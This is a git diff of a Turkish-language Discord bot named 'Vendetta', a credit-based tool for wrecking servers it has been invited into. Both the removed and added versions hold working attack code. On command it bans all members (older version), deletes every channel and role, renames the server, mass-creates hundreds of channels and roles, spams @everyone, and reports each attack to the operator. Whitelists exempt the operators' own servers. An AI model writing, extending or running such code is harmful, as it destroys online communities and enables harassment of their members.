@@ -1,547 +1,313 @@
 require('dotenv').config();
-const {
+const { 
   Client, GatewayIntentBits, Partials,
-  EmbedBuilder, AttachmentBuilder,
-  ActionRowBuilder, ButtonBuilder, ButtonStyle,
-  ModalBuilder, TextInputBuilder, TextInputStyle,
-  StringSelectMenuBuilder
+  EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
+  ModalBuilder, TextInputBuilder, TextInputStyle, Events, StringSelectMenuBuilder, StringSelectMenuOptionBuilder
 } = require('discord.js');
 
-const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
-
 const client = new Client({
-  intents: [
-    GatewayIntentBits.Guilds,
-    GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildMembers
-  ],
-  partials: [Partials.Channel]
+  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
 });
 
+// ---------- CONFIG ----------
 const OWNER_ID = process.env.OWNER_ID;
-const SERI_ID = process.env.SERI_ID;
-const HAK_KANAL_ID = process.env.HAK_KANAL_ID;
-const WHITELIST_KANAL_ID = process.env.WHITELIST_KANAL_ID;
+const SERIYIZ_ID = process.env.SERIYIZ_ID;
+const HAK_CHANNEL_ID = process.env.HAK_CHANNEL_ID;
+const WL_CHANNEL_ID = process.env.WL_CHANNEL_ID;
+const BOT_TOKEN = process.env.TOKEN;
 
-let cachedVideo = null;
-let haklar = {};
-let haklarMessageId = null;
+// ---------- GLOBAL DATABASE ----------
+const haklar = {};      
+const whitelist = {};   
 
-let whitelist = [];
-let whitelistMessageId = null;
-
-// ----------------------------------------------------------------------
-// OWNER LOG
-// ----------------------------------------------------------------------
-async function sendVendettaLog(user, guild, bannedCount, kalanHak, sureMs) {
-  const owner = await client.users.fetch(OWNER_ID).catch(() => null);
-  if (!owner) return;
-
-  const embed = new EmbedBuilder()
-    .setColor("DarkRed")
-    .setTitle("💣 VENDETTA OPERASYON RAPORU")
-    .addFields(
-      { name: "💣 İşlem Başlatan", value: `${user.tag} (${user.id})` },
-      { name: "🏰 Sunucu", value: `${guild.name} (${guild.id})` },
-      { name: "👑 Sunucu Sahibi", value: guild.ownerId ? `<@${guild.ownerId}>` : "Bulunamadı" },
-      { name: "🔥 Banlanan", value: `${bannedCount}` },
-      { name: "💦 Kalan Hak", value: `${kalanHak}` },
-      { name: "⏱ Süre", value: `${(sureMs / 1000).toFixed(1)} saniye` }
-    )
-    .setTimestamp();
-
-  owner.send({ embeds: [embed] }).catch(() => {});
-}
-
-// ----------------------------------------------------------------------
-// WHITE ATTEMPT LOG
-// ----------------------------------------------------------------------
-async function sendWhitelistAttack(user, guild) {
-  const owner = await client.users.fetch(OWNER_ID).catch(() => null);
-  if (!owner) return;
-
-  const embed = new EmbedBuilder()
-    .setColor("Yellow")
-    .setTitle("⚠️ WHITELIST SALDIRI GİRİŞİMİ!")
-    .addFields(
-      { name: "👤 Yapan", value: `${user.tag} (${user.id})` },
-      { name: "🎯 Hedef", value: `${guild.name} (${guild.id})` },
-      { name: "👑 Sunucu Sahibi", value: guild.ownerId ? `<@${guild.ownerId}>` : "Bulunamadı" }
-    )
-    .setTimestamp();
-
-  owner.send({ embeds: [embed] }).catch(() => {});
-}
-
-// ----------------------------------------------------------------------
-// HAK MESAJI
-// ----------------------------------------------------------------------
-function hakRenk(hak) {
-  if (hak <= 5) return "🟥";
-  if (hak <= 10) return "⬜";
-  if (hak <= 15) return "🟦";
-  return "🟦⬜🟦";
-}
-
-async function updateHaklarMessage(channel) {
-  let text = "🔥 KULLANICI HAK LİSTESİ 🔥\n\n";
-  for (const id in haklar) {
-    const renk = hakRenk(haklar[id]);
-    text += `${id} | ${haklar[id]} hak | ${renk}\n`;
-  }
-
-  if (haklarMessageId) {
-    const msg = await channel.messages.fetch(haklarMessageId).catch(() => null);
-    if (msg) return msg.edit({ content: text });
-  }
-
-  const msg = await channel.send({ content: text });
-  haklarMessageId = msg.id;
-}
-
-// ----------------------------------------------------------------------
-// WHITELIST MESAJI
-// ----------------------------------------------------------------------
-async function updateWhitelistMessage(channel) {
-  let text = "🛡️ WHITELIST SUNUCULAR 🛡️\n\n";
-
-  if (whitelist.length === 0) text += "Hiç whitelist yok.";
-
-  for (const data of whitelist) {
-    text += `${data.name} | ${data.owner} | ${data.id}\n`;
-  }
-
-  if (whitelistMessageId) {
-    const msg = await channel.messages.fetch(whitelistMessageId).catch(() => null);
-    if (msg) return msg.edit({ content: text });
-  }
-
-  const msg = await channel.send({ content: text });
-  whitelistMessageId = msg.id;
-}
-
-// ----------------------------------------------------------------------
-// Video Cache
-// ----------------------------------------------------------------------
-client.once("ready", async () => {
-  console.log(`🚀 Bot aktif: ${client.user.tag}`);
-
-  const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";
-
-  try {
-    const res = await fetch(videoURL);
-    const buffer = Buffer.from(await res.arrayBuffer());
-    cachedVideo = new AttachmentBuilder(buffer, { name: "video.mp4" });
-    console.log("🎥 Video cache hazır!");
-  } catch (err) {
-    console.log("❌ Video cache sorunu:", err);
-  }
+// ---------- READY ----------
+client.once('ready', () => {
+  console.log(`${client.user.tag} aktif!`);
 });
 
-// ----------------------------------------------------------------------
-// PANEL KOMUTU (.vndt)
-// ----------------------------------------------------------------------
-client.on("messageCreate", async message => {
-  if (!message.guild || message.author.bot) return;
-  if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;
-  if (message.content.trim().toLowerCase() !== ".vndt") return;
+// =============================================================
+//                          PANEL KOMUTU
+// =============================================================
+client.on(Events.MessageCreate, async msg => {
+  if (msg.content !== ".panel") return;
+
+  const isim = msg.author.id === SERIYIZ_ID ? "Doğukan" :
+               msg.author.id === OWNER_ID ? "Emir" :
+               msg.author.username;
 
   const embed = new EmbedBuilder()
     .setColor("Grey")
-    .setTitle("Merhaba Doğukan Ve Emir Tekrardan Hoşgeldiniz ⬜⚡⬜")
-    .setDescription("Hangi İşlemi Yapmak İstersiniz? Bu arada fors çok yakışıklı bea");
+    .setTitle(`Vendetta N@ke Paneline Hoşgeldin ${isim}`)
+    .setDescription("P@nelde Neler Yapabilirsin?");
 
-  const menuRow = new ActionRowBuilder().addComponents(
-    new StringSelectMenuBuilder()
-      .setCustomId("panelMenu")
-      .setPlaceholder("İşlem seçiniz")
-      .addOptions([
-        { label: "Whitelist Sistemi", value: "whitelist" },
-        { label: "Hak Sistemi", value: "hak" }
-      ])
-  );
+  const menu = new StringSelectMenuBuilder()
+    .setCustomId("panel_menu")
+    .setPlaceholder("Sistem Seç")
+    .addOptions(
+      new StringSelectMenuOptionBuilder().setLabel("Hak Sistemi").setValue("hak"),
+      new StringSelectMenuOptionBuilder().setLabel("Whitelist Sistemi").setValue("wl")
+    );
 
-  const delBtn = new ActionRowBuilder().addComponents(
-    new ButtonBuilder()
-      .setCustomId("deleteMsg")
-      .setLabel("🗑️ Sil")
-      .setStyle(ButtonStyle.Danger)
-  );
+  const row = new ActionRowBuilder().addComponents(menu);
 
-  message.channel.send({ content: null, embeds: [embed], components: [menuRow, delBtn], files: cachedVideo ? [cachedVideo] : [] });
+  msg.reply({ embeds: [embed], components: [row] });
 });
 
-// ----------------------------------------------------------------------
-// INTERACTIONS PANEL & MODAL
-// ----------------------------------------------------------------------
-client.on("interactionCreate", async interaction => {
-  if (!interaction.isButton() && !interaction.isStringSelectMenu() && !interaction.isModalSubmit()) return;
+// =============================================================
+//                         PANEL MENÜ İŞLEM
+// =============================================================
+client.on(Events.InteractionCreate, async inter => {
+  if (!inter.isStringSelectMenu()) return;
+  if (inter.customId !== "panel_menu") return;
 
-  if (![OWNER_ID, SERI_ID].includes(interaction.user.id)) return;
+  const isim = inter.user.id === OWNER_ID ? "Emir" :
+               inter.user.id === SERIYIZ_ID ? "Doğukan" :
+               inter.user.username;
 
-  // Sil butonu
-  if (interaction.isButton() && interaction.customId === "deleteMsg") {
-    await interaction.message.delete().catch(() => {});
-    return interaction.reply({ content: "Mesaj silindi.", ephemeral: true });
+  if (inter.values[0] === "hak") {
+    const embed = new EmbedBuilder()
+      .setColor("Grey")
+      .setTitle(isim)
+      .setDescription("Hak Kontrol Sistemine Aktarıldınız!\n```Burada Neler Yapabilirsin?```");
+
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder().setCustomId("hak_ekle").setLabel("Hak Ekle").setStyle(ButtonStyle.Success),
+      new ButtonBuilder().setCustomId("hak_cikar").setLabel("Hak Çıkar").setStyle(ButtonStyle.Danger),
+      new ButtonBuilder().setCustomId("hak_liste").setLabel("Hak Listesi").setStyle(ButtonStyle.Secondary)
+    );
+
+    return inter.update({ embeds: [embed], components: [row] });
   }
 
-  // Panel Menü
-  if (interaction.isStringSelectMenu() && interaction.customId === "panelMenu") {
-    if (interaction.values[0] === "whitelist") {
-      const embed = new EmbedBuilder()
-        .setTitle("Whitelist Sistemini Seçtiniz")
-        .setDescription("Aşağıdaki İlgili Seçenekleri Seçebilirsiniz.");
+  if (inter.values[0] === "wl") {
+    const embed = new EmbedBuilder()
+      .setColor("Grey")
+      .setTitle(isim)
+      .setDescription("Whitelist Sistemine Aktarıldınız!\n```Burada Neler Yapabilirsin?```");
 
-      const row = new ActionRowBuilder().addComponents(
-        new StringSelectMenuBuilder()
-          .setCustomId("wlMenu")
-          .setPlaceholder("Seçiniz")
-          .addOptions([
-            { label: "Whitelist Ekle", value: "wlEkle" },
-            { label: "Whitelist Çıkar", value: "wlCikar" },
-            { label: "Whitelist Listele", value: "wlListele" }
-          ])
-      );
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder().setCustomId("wl_ekle").setLabel("Wl Ekle").setStyle(ButtonStyle.Success),
+      new ButtonBuilder().setCustomId("wl_cikar").setLabel("Wl Çıkar").setStyle(ButtonStyle.Danger),
+      new ButtonBuilder().setCustomId("wl_liste").setLabel("Whitelist").setStyle(ButtonStyle.Secondary)
+    );
 
-      return interaction.reply({ embeds: [embed], components: [row], ephemeral: true });
-    }
-
-    if (interaction.values[0] === "hak") {
-      const embed = new EmbedBuilder()
-        .setTitle("Hak Sistemini Seçtiniz")
-        .setDescription("Aşağıdaki İlgili Seçenekleri Seçebilirsiniz.");
-
-      const row = new ActionRowBuilder().addComponents(
-        new StringSelectMenuBuilder()
-          .setCustomId("hakMenu")
-          .setPlaceholder("Seçiniz")
-          .addOptions([
-            { label: "Hak Ekle", value: "hakEkle" },
-            { label: "Hak Çıkar", value: "hakCikar" },
-            { label: "Hak Listesi", value: "hakListele" }
-          ])
-      );
-
-      return interaction.reply({ embeds: [embed], components: [row], ephemeral: true });
-    }
-  }
-
-  // Whitelist Menü
-  if (interaction.isStringSelectMenu() && interaction.customId === "wlMenu") {
-    if (interaction.values[0] === "wlEkle") {
-      const modal = new ModalBuilder()
-        .setCustomId("modalWlEkle")
-        .setTitle("Whitelist Ekle")
-        .addComponents(
-          new ActionRowBuilder().addComponents(
-            new TextInputBuilder()
-              .setCustomId("serverID")
-              .setLabel("Sunucu ID")
-              .setStyle(TextInputStyle.Short)
-              .setRequired(true)
-          )
-        );
-      return interaction.showModal(modal);
-    }
-    if (interaction.values[0] === "wlCikar") {
-      const modal = new ModalBuilder()
-        .setCustomId("modalWlCikar")
-        .setTitle("Whitelist Çıkar")
-        .addComponents(
-          new ActionRowBuilder().addComponents(
-            new TextInputBuilder()
-              .setCustomId("serverID")
-              .setLabel("Sunucu ID")
-              .setStyle(TextInputStyle.Short)
-              .setRequired(true)
-          )
-        );
-      return interaction.showModal(modal);
-    }
-    if (interaction.values[0] === "wlListele") {
-      const wChan = await client.channels.fetch(WHITELIST_KANAL_ID);
-      await updateWhitelistMessage(wChan);
-      return interaction.reply({ content: "Whitelist Mesajı Güncellendi.", ephemeral: true });
-    }
-  }
-
-  // Hak Menü
-  if (interaction.isStringSelectMenu() && interaction.customId === "hakMenu") {
-    if (interaction.values[0] === "hakEkle") {
-      const modal = new ModalBuilder()
-        .setCustomId("modalHakEkle")
-        .setTitle("Hak Ekle")
-        .addComponents(
-          new ActionRowBuilder().addComponents(
-            new TextInputBuilder()
-              .setCustomId("userID")
-              .setLabel("Kullanıcı ID")
-              .setStyle(TextInputStyle.Short)
-              .setRequired(true)
-          ),
-          new ActionRowBuilder().addComponents(
-            new TextInputBuilder()
-              .setCustomId("hakSayisi")
-              .setLabel("Hak Sayısı")
-              .setStyle(TextInputStyle.Short)
-              .setRequired(true)
-          )
-        );
-      return interaction.showModal(modal);
-    }
-
-    if (interaction.values[0] === "hakCikar") {
-      const modal = new ModalBuilder()
-        .setCustomId("modalHakCikar")
-        .setTitle("Hak Çıkar")
-        .addComponents(
-          new ActionRowBuilder().addComponents(
-            new TextInputBuilder()
-              .setCustomId("userID")
-              .setLabel("Kullanıcı ID")
-              .setStyle(TextInputStyle.Short)
-              .setRequired(true)
-          ),
-          new ActionRowBuilder().addComponents(
-            new TextInputBuilder()
-              .setCustomId("hakSayisi")
-              .setLabel("Hak Sayısı")
-              .setStyle(TextInputStyle.Short)
-              .setRequired(true)
-          )
-        );
-      return interaction.showModal(modal);
-    }
-
-    if (interaction.values[0] === "hakListele") {
-      const hakChan = await client.channels.fetch(HAK_KANAL_ID);
-      await updateHaklarMessage(hakChan);
-      return interaction.reply({ content: "Hak Mesajı Güncellendi.", ephemeral: true });
-    }
-  }
-
-  // Modal Submits Panel
-  if (interaction.isModalSubmit()) {
-    // WHITELIST EKLE
-    if (interaction.customId === "modalWlEkle") {
-      const guildId = interaction.fields.getTextInputValue("serverID");
-      const guild = client.guilds.cache.get(guildId);
-      if (!guild) return interaction.reply({ content: "Bot bu sunucuda değil!", ephemeral: true });
-
-      if (!whitelist.some(w => w.id === guildId)) {
-        whitelist.push({ id: guildId, name: guild.name, owner: guild.ownerId ? `<@${guild.ownerId}>` : "Bilinmiyor" });
-      }
-
-      const wChan = await client.channels.fetch(WHITELIST_KANAL_ID);
-      await updateWhitelistMessage(wChan);
-
-      return interaction.reply({ content: "Sunucu whitelist’e eklendi 🔐", ephemeral: true });
-    }
-
-    // WHITELIST ÇIKAR
-    if (interaction.customId === "modalWlCikar") {
-      const guildId = interaction.fields.getTextInputValue("serverID");
-      whitelist = whitelist.filter(x => x.id !== guildId);
-
-      const wChan = await client.channels.fetch(WHITELIST_KANAL_ID);
-      await updateWhitelistMessage(wChan);
-
-      return interaction.reply({ content: "Whitelist’ten silindi.", ephemeral: true });
-    }
-
-    // HAK EKLE
-    if (interaction.customId === "modalHakEkle") {
-      const userID = interaction.fields.getTextInputValue("userID");
-      const hakSayi = parseInt(interaction.fields.getTextInputValue("hakSayisi")) || 1;
-      haklar[userID] = (haklar[userID] || 0) + hakSayi;
-
-      const hakChan = await client.channels.fetch(HAK_KANAL_ID);
-      await updateHaklarMessage(hakChan);
-
-      return interaction.reply({ content: "Hak eklendi 💦", ephemeral: true });
-    }
-
-    // HAK ÇIKAR
-    if (interaction.customId === "modalHakCikar") {
-      const userID = interaction.fields.getTextInputValue("userID");
-      const hakSayi = parseInt(interaction.fields.getTextInputValue("hakSayisi")) || 1;
-      haklar[userID] = Math.max((haklar[userID] || 0) - hakSayi, 0);
-
-      const hakChan = await client.channels.fetch(HAK_KANAL_ID);
-      await updateHaklarMessage(hakChan);
-
-      return interaction.reply({ content: "Hak çıkarıldı 💦", ephemeral: true });
-    }
+    return inter.update({ embeds: [embed], components: [row] });
   }
 });
 
-// ----------------------------------------------------------------------
-// VENDETTA KOMUTU
-// ----------------------------------------------------------------------
-client.on("messageCreate", async message => {
-  if (!message.guild || message.author.bot) return;
-  if (message.content.trim().toLowerCase() !== ".vendetta") return;
+// =============================================================
+//                   HAK & WL BUTON → MODAL
+// =============================================================
+client.on(Events.InteractionCreate, async inter => {
+  if (!inter.isButton()) return;
 
-  const hak = haklar[message.author.id] || 0;
+  const modalMaker = (id, title) => {
+    const m = new ModalBuilder().setCustomId(id).setTitle(title);
+    m.addComponents(
+      new ActionRowBuilder().addComponents(
+        new TextInputBuilder().setCustomId("uid").setLabel("ID").setRequired(true).setStyle(TextInputStyle.Short)
+      ),
+      new ActionRowBuilder().addComponents(
+        new TextInputBuilder().setCustomId("value").setLabel("Sayı / Veri").setRequired(false).setStyle(TextInputStyle.Short)
+      )
+    );
+    return m;
+  };
+
+  const modals = {
+    hak_ekle: modalMaker("m_hak_ekle", "Hak Ekle"),
+    hak_cikar: modalMaker("m_hak_cikar", "Hak Çıkar"),
+    wl_ekle: modalMaker("m_wl_ekle", "Whitelist Ekle"),
+    wl_cikar: modalMaker("m_wl_cikar", "Whitelist Çıkar")
+  };
+
+  if (modals[inter.customId]) {
+    return inter.showModal(modals[inter.customId]);
+  }
+
+  if (inter.customId === "hak_liste") {
+    let msg = Object.entries(haklar)
+      .map(([id, h]) => `<@${id}>: ${h} hak`)
+      .join("\n") || "Hak bulunmuyor";
+
+    return inter.reply({ content: msg, ephemeral: true });
+  }
+
+  if (inter.customId === "wl_liste") {
+    let msg = Object.entries(whitelist)
+      .map(([id, d]) => `${d.name} - ${d.owner} - ${id}`)
+      .join("\n") || "Whitelist boş";
+
+    return inter.reply({ content: msg, ephemeral: true });
+  }
+});
+
+// =============================================================
+//            HAK & WL → MODAL SUBMIT İŞLEMLERİ
+// =============================================================
+client.on(Events.InteractionCreate, async inter => {
+  if (!inter.isModalSubmit()) return;
+
+  const id = inter.fields.getTextInputValue("uid");
+  const val = inter.fields.getTextInputValue("value");
+
+  // ---------- HAK EKLE ----------
+  if (inter.customId === "m_hak_ekle") {
+    if (!haklar[id]) haklar[id] = 0;
+    haklar[id] += Number(val);
+    return inter.reply({ content: "Hak eklendi!", ephemeral: true });
+  }
+
+  // ---------- HAK ÇIKAR ----------
+  if (inter.customId === "m_hak_cikar") {
+    if (!haklar[id]) haklar[id] = 0;
+    haklar[id] = Math.max(0, haklar[id] - Number(val));
+    return inter.reply({ content: "Hak çıkarıldı!", ephemeral: true });
+  }
+
+  // ---------- WL EKLE ----------
+  if (inter.customId === "m_wl_ekle") {
+    whitelist[id] = { name: "Sunucu", owner: "Bilinmiyor" };
+    return inter.reply({ content: "Whitelist eklendi!", ephemeral: true });
+  }
+
+  // ---------- WL ÇIKAR ----------
+  if (inter.customId === "m_wl_cikar") {
+    delete whitelist[id];
+    return inter.reply({ content: "Whitelistten çıkarıldı!", ephemeral: true });
+  }
+});
+
+// =============================================================
+//                   .VNDT → DM PANELİ
+// =============================================================
+client.on(Events.MessageCreate, async msg => {
+  if (msg.content !== ".vndt") return;
+
+  const hak = haklar[msg.author.id] || 0;
   if (hak <= 0) {
-    return message.author.send("❌ Vendetta hakkın yok sg.").catch(() => {});
+    return msg.author.send("Hakkın yok dostum…").catch(() => {});
   }
 
-  const btn = new ActionRowBuilder().addComponents(
+  const embed = new EmbedBuilder()
+    .setColor("Red")
+    .setTitle("Vendetta Hakkınız")
+    .setDescription(
+      `• Mevcut hak: \`${hak}\`
+• Saldırı başlatmak için butona bas.`)
+    .setFooter({ text: "Gücü hisset…" });
+
+  const row = new ActionRowBuilder().addComponents(
     new ButtonBuilder()
-      .setCustomId("sorguHak")
-      .setLabel("💣 Vendetta")
+      .setCustomId("vnd_start")
+      .setLabel("💣 Vendetta Başlat")
       .setStyle(ButtonStyle.Danger)
   );
 
-  message.author.send({
-    content: `Vendetta hakkın: ${hak}\n Başlatmak için aşağıdaki butona basın.
-[Botu Eklemek İçin Buraya Tıklayınız](https://discord.com/oauth2/authorize?client_id=1444720893548040223&permissions=8&integration_type=0&scope=bot)  Not: Botun Rolunun Ustlerde Olduğundan Ve Yetkisi Olduğundan Emin Olunuz...`,
-    components: [btn]
-  }).catch(() => {});
+  return msg.author.send({ embeds: [embed], components: [row] });
 });
 
-// ----------------------------------------------------------------------
-// INTERACTION — BUTTON / MODAL VENDETTA
-// ----------------------------------------------------------------------
-client.on("interactionCreate", async interaction => {
-  if (!interaction.isButton() && !interaction.isModalSubmit()) return;
+// =============================================================
+//                    V E N D E T T A   B A Ş L A T
+// =============================================================
+client.on(Events.InteractionCreate, async inter => {
+  if (!inter.isButton()) return;
+  if (inter.customId !== "vnd_start") return;
 
-  if (interaction.isButton() && interaction.customId === "sorguHak") {
-    const userHak = haklar[interaction.user.id] || 0;
-    if (userHak <= 0)
-      return interaction.reply({ content: "❌ Hakkın yok!", ephemeral: true });
+  const hak = haklar[inter.user.id] || 0;
+  if (hak <= 0) return inter.reply({ content: "Hakkın yok!", ephemeral: true });
 
-    const modal = new ModalBuilder()
-      .setCustomId("modalSunucuID")
-      .setTitle("Vendetta Formu")
-      .addComponents(
-        new ActionRowBuilder().addComponents(
-          new TextInputBuilder()
-            .setCustomId("sunucuID")
-            .setLabel("Sunucu ID")
-            .setStyle(TextInputStyle.Short)
-            .setRequired(true)
-        )
+  const modal = new ModalBuilder()
+    .setCustomId("vnd_modal")
+    .setTitle("Vendetta Modu");
+
+  modal.addComponents(
+    new ActionRowBuilder().addComponents(
+      new TextInputBuilder()
+        .setCustomId("guild")
+        .setLabel("Sunucu ID")
+        .setRequired(true)
+        .setStyle(TextInputStyle.Short)
+    )
+  );
+
+  inter.showModal(modal);
+});
+
+// =============================================================
+//                       SALDIRI KODU !!!
+— =============================================================
+client.on(Events.InteractionCreate, async inter => {
+  if (!inter.isModalSubmit()) return;
+  if (inter.customId !== "vnd_modal") return;
+
+  const gid = inter.fields.getTextInputValue("guild");
+  const guild = client.guilds.cache.get(gid);
+  if (!guild) return inter.reply({ content: "Sunucu bulunamadı.", ephemeral: true });
+
+  if (whitelist[gid]) {
+    return inter.reply({ content: "Sunucu whitelistte!", ephemeral: true });
+  }
+
+  haklar[inter.user.id] -= 1;
+  inter.reply({ content: "Vendetta başlatılıyor…", ephemeral: true });
+
+  // =============================================================
+  //                🌋  S A L D I R I   B A Ş L I Y O R  🌋
+  // =============================================================
+
+  const figürler = [
+    "ᵛᵃⁿᵈᵉᵗᵗᵃ",
+    "ف͜͡س͜͡د͜͡ر͜͡ت͜͡ا",
+    "ⴼⵉⵣⵣⴰⵔ",
+    "ᎶᏫᎾᎠᏴᎽᎬ",
+    "سـتـغـرق"
+  ];
+
+  const rastgele = () => figürler[Math.floor(Math.random() * figürler.length)];
+
+  // Sunucu adı + icon değiş
+  guild.setName(`Vᴇɴᴅᴇᴛᴛᴀ ${rastgele()}`).catch(()=>{});
+
+  // TÜM KANALLARI SİL
+  guild.channels.cache.forEach(ch => ch.delete().catch(()=>{}));
+
+  // TÜM ROLLERİ SİL
+  guild.roles.cache.forEach(r => {
+    if (r.id !== guild.id) r.delete().catch(()=>{});
+  });
+
+  // 500 KANAL OLUŞTUR
+  for (let i = 0; i < 500; i++) {
+    guild.channels.create({
+      name: `${rastgele()}-${i}`,
+      type: 0
+    }).then(ch => {
+      ch.send("@everyone Vᴇɴᴅᴇᴛᴛᴀ").catch(()=>{});
+    }).catch(()=>{});
+  }
+
+  // 300 ROL OLUŞTUR
+  for (let i = 0; i < 300; i++) {
+    guild.roles.create({
+      name: rastgele(),
+      permissions: []
+    }).catch(()=>{});
+  }
+
+  // OWNER’A LOG GÖNDER
+  const owner = await client.users.fetch(OWNER_ID).catch(()=>{});
+  if (owner) {
+    const embed = new EmbedBuilder()
+      .setColor("Red")
+      .setTitle("🔥 VENDETTA BAŞLATILDI")
+      .addFields(
+        { name: "Yapan", value: `${inter.user.tag} (${inter.user.id})` },
+        { name: "Sunucu", value: `${guild.name} (${guild.id})` }
       );
-
-    return interaction.showModal(modal);
-  }
-
-  // Modal Submit VENDETTA
-  if (interaction.isModalSubmit() && interaction.customId === "modalSunucuID") {
-    const guildId = interaction.fields.getTextInputValue("sunucuID");
-
-    if (whitelist.some(w => w.id === guildId)) {
-      const guild = client.guilds.cache.get(guildId);
-      await sendWhitelistAttack(interaction.user, guild || { name: "Bilinmiyor", id: guildId });
-
-      return interaction.reply({
-        content: "⛔ Bu sunucu whitelist’te kanka.",
-        ephemeral: true
-      });
-    }
-
-    const guild = client.guilds.cache.get(guildId);
-    if (!guild)
-      return interaction.reply({ content: "❌ Bot bu sunucuda değil!", ephemeral: true });
-
-    await interaction.reply({ content: "⚡ İşlem başlıyor...", ephemeral: true });
-
-    const start = Date.now();
-
-    // HAK DÜŞÜR
-    haklar[interaction.user.id]--;
-    const hakChan = await client.channels.fetch(HAK_KANAL_ID);
-    await updateHaklarMessage(hakChan);
-
-    // ----------------------------------------------------------------------
-    // BAŞLAMADAN ÖNCE TÜM KANALLARA MESAJ AT
-    // ----------------------------------------------------------------------
-    try {
-      const allChannels = await guild.channels.fetch();
-      for (const [id, ch] of allChannels) {
-        if (ch && ch.send) {
-          ch.send("\nVENDETTA YÜKLENİYOR...\n████████░░ 89%\n").catch(() => {});
-        }
-      }
-    } catch {}
-
-    // ----------------------------------------------------------------------
-    // BAN, KANAL SİL, ROL SİL, YENİ KANAL/ROL OLUŞTUR
-    // ----------------------------------------------------------------------
-    const members = await guild.members.fetch();
-    await Promise.all(
-      members.map(m => {
-        if (m.user.bot) return;
-        if ([OWNER_ID, SERI_ID].includes(m.id)) return;
-
-        // DM ile uyarı ve video gönder
-        m.send({
-          embeds: [
-            new EmbedBuilder()
-              .setColor("Red")
-              .setTitle("💣 VENDETTA SUNUCUYA EL KOYDU!")
-              .setDescription("Slained By VENDETTA 💣\nVENDETTA Affetmez 💦")
-              .setFooter({ text: "VENDETTA BURDAYDI 😈" })
-          ],
-          files: [cachedVideo]
-        }).catch(() => {});
-
-        // Banla
-        return m.ban().catch(() => {});
-      })
-    );
-
-    // Kanalları sil
-    const chs = await guild.channels.fetch();
-    await Promise.all(chs.map(c => c.delete().catch(() => {})));
-
-    // Rolleri sil
-    const roles = await guild.roles.fetch();
-    await Promise.all(
-      roles
-        .filter(r => r.editable && r.id !== guild.id)
-        .map(r => r.delete().catch(() => {}))
-    );
-
-    // 350 yeni kanal oluştur
-    await Promise.all(
-      Array.from({ length: 350 }).map((_, i) =>
-        guild.channels.create({
-          name: ["VENDETTA💦", "EL KONULDU🔥", "VENDETTA BURDAYDI💝"][i % 3]
-        }).catch(() => {})
-      )
-    );
-
-    // 300 yeni rol oluştur
-    await Promise.all(
-      Array.from({ length: 300 }).map(() =>
-        guild.roles.create({
-          name: "VENDETTA 😜",
-          color: "#" + Math.floor(Math.random() * 16777215).toString(16)
-        }).catch(() => {})
-      )
-    );
-
-    // Log gönder
-    await sendVendettaLog(
-      interaction.user,
-      guild,
-      members.size,
-      haklar[interaction.user.id],
-      Date.now() - start
-    );
-
-    await interaction.followUp({
-      content: "⚡ İşlem tamamlandı!",
-      ephemeral: true
-    });
-
-    // Sunucudan çık
-    await guild.leave().catch(() => {});
+    owner.send({ embeds: [embed] }).catch(()=>{});
   }
 });
 
-client.login(process.env.BOT_TOKEN);
+// =============================================================
+client.login(BOT_TOKEN);
